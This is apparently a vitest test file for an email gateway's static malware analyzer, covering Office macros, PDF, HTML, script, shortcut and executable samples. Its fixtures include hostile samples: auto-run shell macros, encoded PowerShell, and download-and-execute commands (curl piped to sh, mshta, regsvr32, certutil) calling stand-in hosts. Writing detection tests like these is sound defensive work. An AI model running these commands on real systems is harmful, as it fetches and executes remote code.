import { randomBytes } from 'node:crypto';
import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { SANDBOX_FINDING_CODES } from '@email-gateway/security-contracts';
import { describe, expect, it } from 'vitest';
import { STATIC_FINDING_CODES, type AnalysisResult } from './analysis';
import { analyzeSample, STATIC_SUPPORTED_TYPES } from './analyze';
import { CompoundFile } from './cfb';
import {
  buildCfb,
  buildDocx,
  buildElf,
  buildLnk,
  buildPdf,
  buildPe,
  buildZip,
  compressOvba,
  rawContainer,
  vbaStorage,
} from './fixtures.test-support';
import { eicarTestString, hostOfAuthority } from './generic';
import { decompressOvba, OvbaError } from './ovba';

const codes = (r: AnalysisResult): string[] => r.findings.map((f) => f.code).sort();
const count = (r: AnalysisResult, code: string): number =>
  r.findings.find((f) => f.code === code)?.count ?? 0;

describe('static analyzer vocabulary', () => {
  it('emits only finding codes of the security contracts', () => {
    for (const code of STATIC_FINDING_CODES) expect(SANDBOX_FINDING_CODES).toContain(code);
  });

  it('supports every default platform sandbox file type', () => {
    for (const type of [
      'pdf',
      'ooxml_word',
      'ole_office',
      'rtf',
      'pe_executable',
      'msi',
      'elf',
      'lnk',
      'script_js',
      'hta',
      'html',
      'svg',
    ]) {
      expect(STATIC_SUPPORTED_TYPES).toContain(type);
    }
    expect(STATIC_SUPPORTED_TYPES).not.toContain('zip');
    expect(STATIC_SUPPORTED_TYPES).not.toContain('png');
  });

  it('keeps the analyzer child module graph to node built-ins and this directory', () => {
    const dir = join(__dirname, '..');
    const files = [
      'analyzer-child.ts',
      'protocol.ts',
      ...readdirSync(__dirname)
        .filter((f) => f.endsWith('.ts') && !f.includes('.test'))
        .map((f) => `analyzers/${f}`),
    ];
    for (const file of files) {
      const source = readFileSync(join(dir, file), 'utf8');
      for (const match of source.matchAll(/^import[^'"]*['"]([^'"]+)['"]/gm)) {
        const spec = match[1] as string;
        expect(
          spec.startsWith('./') || spec.startsWith('../') || spec.startsWith('node:'),
          `${file}: ${spec}`,
        ).toBe(true);
        expect(spec, `${file} imports child_process`).not.toContain('child_process');
        expect(spec.startsWith('../../'), `${file}: ${spec} leaves the static directory`).toBe(
          false,
        );
      }
      // No evaluation: a real call is `eval(`; the analyzers' patterns spell `eval\s*\(`.
      expect(source).not.toMatch(/\beval\(|new Function\(|from 'node:vm'|require\('(node:)?vm'\)/);
    }
  });
});

describe('MS-OVBA decompression', () => {
  it('round-trips compressed and raw containers', () => {
    const text = Buffer.from(
      `Attribute VB_Name = "Module1"\r\n${'Sub AutoOpen()\r\n  MsgBox "hi"\r\nEnd Sub\r\n'.repeat(300)}`,
      'latin1',
    );
    expect(decompressOvba(compressOvba(text)).equals(text)).toBe(true);
    const raw = decompressOvba(rawContainer(Buffer.from('abc')));
    expect(raw.subarray(0, 3).toString()).toBe('abc');
    const random = randomBytes(9000);
    expect(decompressOvba(compressOvba(random)).subarray(0, random.length).equals(random)).toBe(
      true,
    );
  });

  it('refuses a bad signature, a bad chunk and output above the limit', () => {
    expect(() => decompressOvba(Buffer.from([0x02, 0x00]))).toThrow(OvbaError);
    expect(() => decompressOvba(Buffer.from([0x01, 0xff, 0x0f]))).toThrow(OvbaError);
    const big = compressOvba(Buffer.alloc(100_000, 0x41));
    expect(() => decompressOvba(big, 0, 1000)).toThrow(/limit/);
  });
});

describe('ole (compound file + VBA)', () => {
  it('walks the directory with parents and reads mini and regular streams', () => {
    const big = Buffer.alloc(5000, 7);
    const cfb = new CompoundFile(
      buildCfb([
        { name: 'small', type: 'stream', data: Buffer.from('hello') },
        { name: 'big', type: 'stream', data: big },
        { name: 'Macros', type: 'storage', children: [vbaStorage('Sub X()\r\nEnd Sub')] },
      ]),
    );
    const small = cfb.entries.find((e) => e.name === 'small');
    const bigEntry = cfb.entries.find((e) => e.name === 'big');
    expect(cfb.read(small!).toString()).toBe('hello');
    expect(cfb.read(bigEntry!).equals(big)).toBe(true);
    const vba = cfb.entries.find((e) => e.name === 'VBA');
    expect(cfb.entries[vba!.parent!]?.name).toBe('Macros');
  });

  it('finds auto-exec + shell macros (the combined high finding)', () => {
    const doc = buildCfb([
      { name: 'WordDocument', type: 'stream', data: Buffer.alloc(600, 1) },
      {
        name: 'Macros',
        type: 'storage',
        children: [
          vbaStorage(
            'Sub AutoOpen()\r\n  Dim s\r\n  Set s = CreateObject("WScript.Shell")\r\n  s.Run "calc"\r\nEnd Sub\r\n',
          ),
        ],
      },
    ]);
    const r = analyzeSample(doc, 'ole_office');
    expect(r.format).toBe('ole');
    expect(codes(r)).toEqual(
      expect.arrayContaining([
        'static.office_macro',
        'static.office_auto_exec',
        'static.office_macro_shell',
        'static.office_auto_exec_shell',
      ]),
    );
    expect(r.tokens).toEqual(expect.arrayContaining(['AutoOpen', 'WScript.Shell']));
  });

  it('reports a harmless macro as office_macro only', () => {
    const r = analyzeSample(
      buildCfb([
        {
          name: 'Macros',
          type: 'storage',
          children: [vbaStorage('Sub Hello()\r\n  MsgBox "hi"\r\nEnd Sub\r\n')],
        },
      ]),
      'ole_office',
    );
    expect(codes(r)).toEqual(['static.office_macro']);
  });

  it('reports embedded OLE objects', () => {
    const r = analyzeSample(
      buildCfb([
        {
          name: 'ObjectPool',
          type: 'storage',
          children: [
            {
              name: '_1',
              type: 'storage',
              children: [{ name: '\u0001Ole10Native', type: 'stream', data: Buffer.from('x') }],
            },
          ],
        },
      ]),
      'ole_office',
    );
    expect(count(r, 'static.office_ole_object')).toBe(2);
  });
});

describe('ooxml', () => {
  it('analyzes vbaProject.bin through the OLE analyzer', () => {
    const vba = buildCfb([
      vbaStorage('Sub Document_Open()\r\n  Shell "powershell -nop"\r\nEnd Sub\r\n'),
    ]);
    const r = analyzeSample(buildDocx({ 'word/vbaProject.bin': vba }), 'ooxml_macro');
    expect(r.format).toBe('ooxml');
    expect(codes(r)).toEqual(
      expect.arrayContaining(['static.office_auto_exec_shell', 'static.office_macro']),
    );
  });

  it('flags an external attached template and records its host', () => {
    const rels =
      '<?xml version="1.0"?><Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://templates.example.test/t.dotm" TargetMode="External"/></Relationships>';
    const r = analyzeSample(buildDocx({ 'word/_rels/settings.xml.rels': rels }), 'ooxml_word');
    expect(codes(r)).toContain('static.office_external_template');
    expect(r.hosts).toContain('templates.example.test');
  });

  it('flags a DDE field split across runs and embedded OLE objects', () => {
    const document =
      '<w:document><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\\\x "y"</w:instrText></w:r></w:p></w:body></w:document>';
    const r = analyzeSample(
      buildDocx({
        'word/document.xml': document,
        'word/embeddings/oleObject1.bin': Buffer.alloc(10),
      }),
      'ooxml_word',
    );
    expect(codes(r)).toEqual(
      expect.arrayContaining(['static.office_dde', 'static.office_ole_object']),
    );
  });

  it('finds nothing in a plain document (no entropy finding for a zip container)', () => {
    expect(codes(analyzeSample(buildDocx({}), 'ooxml_word'))).toEqual([]);
  });
});

describe('pdf', () => {
  it('counts JavaScript, OpenAction, Launch, EmbeddedFile and URI hosts', () => {
    const pdf = buildPdf([
      '<< /Type /Catalog /OpenAction 2 0 R /Names << /EmbeddedFiles 3 0 R >> >>',
      '<< /S /JavaScript /JS (app.alert\\(1\\)) >>',
      '<< /S /Launch /F (cmd.exe) >>',
      '<< /S /URI /URI (https://pdf-link.example.test/path) >>',
    ]);
    const r = analyzeSample(pdf, 'pdf');
    expect(codes(r)).toEqual(
      expect.arrayContaining([
        'static.pdf_javascript',
        'static.pdf_open_action_js',
        'static.pdf_launch',
        'static.pdf_embedded_file',
      ]),
    );
    expect(r.hosts).toContain('pdf-link.example.test');
  });

  it('decodes #xx names (obfuscation) and reads Flate object streams', () => {
    const r = analyzeSample(
      buildPdf(['<< /Type /Catalog >>'], '2 0 << /S /J#61vaScript /JS (x) /AA << >> >>'),
      'pdf',
    );
    expect(codes(r)).toEqual(
      expect.arrayContaining([
        'static.pdf_obfuscated_names',
        'static.pdf_javascript',
        'static.pdf_open_action_js',
      ]),
    );
    expect(r.facts['pdf.objectStreams']).toBe(1);
  });

  it('finds nothing in a plain PDF', () => {
    expect(codes(analyzeSample(buildPdf(['<< /Type /Catalog /Pages 2 0 R >>']), 'pdf'))).toEqual(
      [],
    );
  });
});

describe('html / svg', () => {
  it('detects blob smuggling, data-URI downloads, password and external forms, meta refresh', () => {
    const html = `<!doctype html><html><head><meta http-equiv="refresh" content="0; url=https://refresh.example.test/"></head><body>
      <form action="https://collect.example.test/login" method="post"><input type="password" name="p"></form>
      <script>var b = new Blob([atob(x)]); var a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'invoice.zip'; a.click();</script>
      </body></html>`;
    const r = analyzeSample(Buffer.from(html), 'html');
    expect(codes(r)).toEqual(
      expect.arrayContaining([
        'static.html_smuggling',
        'static.html_password_form',
        'static.html_external_form',
        'static.html_meta_refresh_external',
      ]),
    );
    expect(r.hosts).toEqual(
      expect.arrayContaining(['collect.example.test', 'refresh.example.test']),
    );
    const data = analyzeSample(
      Buffer.from(
        '<html><a download="x.exe" href="data:application/octet-stream;base64,AAAA">x</a></html>',
      ),
      'html',
    );
    expect(codes(data)).toContain('static.html_smuggling');
  });

  it('detects obfuscated script in an SVG', () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script>eval(atob("${'QUJD'.repeat(150)}"));</script></svg>`;
    const r = analyzeSample(Buffer.from(svg), 'svg');
    expect(r.format).toBe('svg');
    expect(codes(r)).toContain('static.html_obfuscated_script');
  });

  it('finds nothing in a plain page', () => {
    expect(
      codes(
        analyzeSample(
          Buffer.from('<html><body><p>Hello</p><form action="/local"></form></body></html>'),
          'html',
        ),
      ),
    ).toEqual([]);
  });
});

describe('script', () => {
  const cases: [string, string, string][] = [
    [
      'script_ps1',
      'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
      'static.script_encoded_powershell',
    ],
    ['script_ps1', '$d = [Convert]::FromBase64String($s)', 'static.script_encoded_powershell'],
    [
      'script_ps1',
      "(New-Object Net.WebClient).DownloadString('http://cradle.example.test/a')",
      'static.script_download_cradle',
    ],
    [
      'script_shell',
      'curl -s http://cradle.example.test/i.sh | sh',
      'static.script_download_cradle',
    ],
    [
      'script_js',
      'var x = new ActiveXObject("MSXML2.XMLHTTP"); var s = new ActiveXObject("ADODB.Stream");',
      'static.script_download_cradle',
    ],
    ['script_batch', 'mshta http://lolbin.example.test/x.hta', 'static.script_lolbin'],
    [
      'script_batch',
      'regsvr32 /s /n /u /i:http://lolbin.example.test/x.sct scrobj.dll',
      'static.script_lolbin',
    ],
    [
      'script_batch',
      'certutil -urlcache -split -f http://lolbin.example.test/a a.exe',
      'static.script_lolbin',
    ],
    ['script_vbs', 'Set sh = CreateObject("WScript.Shell")', 'static.script_shell_exec'],
    [
      'script_js',
      `var c = [${Array.from({ length: 40 }, (_, i) => 65 + (i % 26)).join(',')}];`,
      'static.script_obfuscation',
    ],
    ['script_vbs', 'x = StrReverse("cba")', 'static.script_obfuscation'],
  ];
  it.each(cases)('%s: %s → %s', (type, text, code) => {
    expect(codes(analyzeSample(Buffer.from(text), type))).toContain(code);
  });

  it('finds nothing in a benign script and decodes UTF-16 scripts', () => {
    expect(codes(analyzeSample(Buffer.from('#!/bin/sh\necho hello\n'), 'script_shell'))).toEqual(
      [],
    );
    const utf16 = Buffer.concat([
      Buffer.from([0xff, 0xfe]),
      Buffer.from('Invoke-WebRequest -Uri x', 'utf16le'),
    ]);
    expect(codes(analyzeSample(utf16, 'script_ps1'))).toContain('static.script_download_cradle');
  });
});

describe('lnk', () => {
  it('reports a shortcut and a shell command line', () => {
    const r = analyzeSample(
      buildLnk({
        relativePath: '..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        arguments: '-nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
      }),
      'lnk',
    );
    expect(codes(r)).toEqual(
      expect.arrayContaining([
        'static.lnk_present',
        'static.lnk_command',
        'static.script_encoded_powershell',
      ]),
    );
    expect(codes(analyzeSample(buildLnk({ relativePath: '.\\notes.txt' }), 'lnk'))).toEqual([
      'static.lnk_present',
    ]);
  });
});

describe('pe', () => {
  it('detects injection, downloader and anti-debug imports', () => {
    const r = analyzeSample(
      buildPe({
        imports: {
          'kernel32.dll': [
            'VirtualAllocEx',
            'WriteProcessMemory',
            'CreateRemoteThread',
            'IsDebuggerPresent',
            'WinExec',
          ],
          'urlmon.dll': ['URLDownloadToFileA'],
        },
      }),
      'pe_executable',
    );
    expect(r.format).toBe('pe');
    expect(codes(r)).toEqual(
      expect.arrayContaining([
        'static.pe_injection_imports',
        'static.pe_downloader_imports',
        'static.pe_anti_debug',
      ]),
    );
    expect(count(r, 'static.pe_injection_imports')).toBe(3);
    expect(r.tokens).toContain('URLDownloadToFileA');
  });

  it('detects packer section names, high-entropy code and an overlay', () => {
    expect(
      codes(analyzeSample(buildPe({ sectionNames: ['UPX0', 'UPX1'] }), 'pe_executable')),
    ).toContain('static.pe_packed');
    expect(codes(analyzeSample(buildPe({ packedCode: true }), 'pe_executable'))).toContain(
      'static.pe_packed',
    );
    expect(
      codes(analyzeSample(buildPe({ overlay: Buffer.alloc(300, 3) }), 'pe_executable')),
    ).toContain('static.pe_overlay');
  });

  it('finds nothing in a minimal benign executable', () => {
    expect(codes(analyzeSample(buildPe(), 'pe_executable'))).toEqual([]);
  });
});

describe('elf', () => {
  it('checks the header and detects UPX', () => {
    const plain = analyzeSample(buildElf(), 'elf');
    expect(plain.facts['elf.headerSane']).toBe(true);
    expect(codes(plain)).toEqual([]);
    expect(codes(analyzeSample(buildElf({ body: Buffer.from('....UPX!....') }), 'elf'))).toContain(
      'static.elf_packed',
    );
  });
});

describe('generic', () => {
  it('detects the EICAR test string (assembled at runtime)', () => {
    const eicar = [
      'X5O!P%@AP[4\\PZX54(P^)7CC)7}',
      '$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
    ].join('');
    expect(eicarTestString()).toBe(eicar);
    expect(codes(analyzeSample(Buffer.from(eicar), 'text'))).toContain('static.eicar_test');
    expect(codes(analyzeSample(Buffer.from(`junk ${eicar} junk`), 'unknown'))).toContain(
      'static.eicar_test',
    );
  });

  it('extracts URL hosts and canonical IPv4 literals, bounded', () => {
    const text = [
      'https://a.example.test/x',
      'http://user:pw@B.Example.Test:8080/y',
      'http://10.1.2.3/',
      'see 192.0.2.7 and 999.1.1.1 and 127.0.0.1',
      'http://01.2.3.4/',
    ].join(' ');
    const r = analyzeSample(Buffer.from(text), 'text');
    expect(r.hosts).toEqual(['a.example.test', 'b.example.test']);
    expect(r.ips).toEqual(expect.arrayContaining(['10.1.2.3', '192.0.2.7']));
    expect(r.ips).not.toContain('127.0.0.1');
    expect(count(r, 'static.embedded_urls')).toBe(2);
    const many = Array.from({ length: 200 }, (_, i) => `https://h${String(i)}.example.test/`).join(
      '\n',
    );
    const bounded = analyzeSample(Buffer.from(many), 'text');
    expect(bounded.hosts).toHaveLength(50);
    expect(bounded.hostTotal).toBe(200);
    expect(hostOfAuthority('[::1]:80')).toBeNull();
    expect(hostOfAuthority('localhost')).toBeNull();
  });

  it('reports high entropy for random data only', () => {
    expect(codes(analyzeSample(randomBytes(64 * 1024), 'unknown'))).toContain(
      'static.high_entropy',
    );
    expect(codes(analyzeSample(Buffer.alloc(64 * 1024, 0x41), 'unknown'))).not.toContain(
      'static.high_entropy',
    );
  });
});

describe('hostile input (fuzz-style)', () => {
  const seeds: Record<string, Buffer> = {
    pe_executable: buildPe({
      imports: { 'kernel32.dll': ['WriteProcessMemory', 'CreateRemoteThread'] },
    }),
    ole_office: buildCfb([
      {
        name: 'Macros',
        type: 'storage',
        children: [vbaStorage('Sub AutoOpen()\r\nShell "x"\r\nEnd Sub')],
      },
    ]),
    ooxml_macro: buildDocx({ 'word/vbaProject.bin': buildCfb([vbaStorage('Sub X()\r\nEnd Sub')]) }),
    pdf: buildPdf(['<< /JS (x) >>'], '<< /JavaScript >>'),
    lnk: buildLnk({ relativePath: 'cmd.exe', arguments: '/c x' }),
    elf: buildElf(),
    html: Buffer.from('<html><script>eval(1)</script></html>'),
    zip: buildZip([{ name: 'a', data: Buffer.from('b') }]),
  };

  it('never throws for truncated, bit-flipped or random input of any type', () => {
    for (const [type, seed] of Object.entries(seeds)) {
      for (const cut of [
        0,
        1,
        7,
        64,
        100,
        511,
        512,
        513,
        Math.floor(seed.length / 2),
        seed.length - 1,
      ]) {
        expect(() => analyzeSample(seed.subarray(0, Math.max(0, cut)), type)).not.toThrow();
      }
      for (let round = 0; round < 25; round += 1) {
        const garbled = Buffer.from(seed);
        for (let i = 0; i < 16; i += 1)
          garbled[Math.floor(Math.random() * garbled.length)] = Math.floor(Math.random() * 256);
        expect(() => analyzeSample(garbled, type)).not.toThrow();
      }
    }
    for (const type of STATIC_SUPPORTED_TYPES) {
      expect(() => analyzeSample(randomBytes(4096), type)).not.toThrow();
    }
  });
});
